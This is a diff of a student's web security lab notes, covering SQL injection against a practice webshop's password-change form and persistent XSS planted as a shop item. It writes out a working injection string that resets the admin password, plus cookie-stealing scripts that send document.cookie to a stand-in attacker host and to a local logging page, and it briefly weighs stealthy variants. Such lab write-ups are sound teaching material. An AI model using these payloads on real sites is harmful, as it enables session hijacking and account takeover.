@@ -29,9 +29,12 @@ otherwise it is echo'ed that the "query: [echo query verbatim] failed".
 * Basics of XSS attacks, especially persistent XSS attacks
 * Write two javascripts
 	* test for XSS vulnerabilities
-	<?php passthru('ls'); ?> ..but JavaScript..
+		`<?php passthru('ls'); ?>` ..but JavaScript..
+		* `<script>alert("xss? xss!")</script>`
 	* steal a user's cookie
-
+		* `<script>document.location='http://malicious-site.evil/steal.php?cookie='`
+		`+ document.cookie; alert("U hav bin pwn3d!!!!1!");</script>`
+		*(Note: alert optional, depending on desired effect.)*
 
 ## Preparatory assignment 4
 * Get knowledge about FireBug, especially how to edit cookies w/ it
@@ -102,11 +105,70 @@ to have.
 	* Abuse change password feature?
 
 ## Problem 4
+* Failing when old=[OLD] and new= `" ;`
+	* output: `query: UPDATE users SET password="" ;" WHERE username="2" failed` 
+* Working injection: `adminpass" WHERE username="admin" #` 
+* **Logged in!**
+
 ## Problem 5
 * Abilities of admin account vs normal account
+	* Can add new items
+	* Can remove all items
+
+* Attack vectors
+	* Can probably do persistent XSS
+
+---
 
 ## Problem 6
+* XSS vulnerability: adding items to shop as admin
+	* Used script from prep-ass. 3. 
+	Output: `Query: INSERT INTO items SET name="xsstest;`
+	* Used `<script>alert("xss")</script>`
+	Got an alert!
+	Output: `Query: INSERT INTO items SET name="" failed`
+	This does not, however, matter since the vulnerability was proved.
+	..Actually, that was just a vector for reflective XSS, not persistent.
+	* Next try: `xss <script>alert('xss')</script>`
+	This worked. An `xss` element was added to Shop,
+	and when Shop page is accessed the alert is triggered.
+	Persistent. Nice.
+* Modified script/entry to Shop page:
+	`it's a steal! <script>document.location='http://localhost2/index.php?cookie='
+	` + document.cookie</script>`
+	Had to remove semicolon because that would end SQL query.
+* The script works by changing location of the DOM to our malicious site.
+That site's php script saves the cookie attached in the GET request, to
+a file named log.txt. It then changes the header to the referer,
+in this case the webshop site.
+This does not result in any noteworthy stealthiness, especially
+since the two sites keep referring to eachother, throwing the
+user agent back and forth like a quick game of Pong.
+The user has a hard time clicking anything because of these.
+Even as attacker, to remove the item one had to actively stop
+loading the site, and then click the Delete All button.
+
+---
+
 ## Problem 7
+* Explanation of scripts:
+	* The first one is explained in Prob. 6.
+	* The second is a link (\<a> element) that refers to google.com,
+	but at mouseover executes the same Javascript as the first variant.
+	* The third instantiates an Image, w/ the source same as the 
+	first two variants refer to. The difference here is that
+	this will neither put user in an eternal loop or require 
+	interaction w/ the element from the user, but execute unseen.
+	Thus, stealthiness.
+* Which works best?
+	* Partial explanation in bullet point above.
+	* Circumstances:
+		* 1: If there is no need to be covert,
+		or if not being covert is the desired effect.
+		E. g. letting somebody know you have control over
+		at least part of their system to scare or blackmail
+		them. Or attacking an automatic system of some sort.
+
 ## Problem 8
 ## Problem 9
 ## Problem 10
